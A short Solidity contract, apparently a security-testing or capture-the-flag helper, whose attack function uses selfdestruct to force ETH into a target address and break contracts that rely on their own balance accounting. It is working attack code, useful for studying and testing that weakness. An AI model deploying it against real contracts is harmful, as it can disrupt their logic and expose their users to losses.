// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract ForceFeeder {

    constructor() payable {}

    // Force l'envoi d'ETH vers une cible via selfdestruct
    function attack(address target) external {
        selfdestruct(payable(target));
    }
}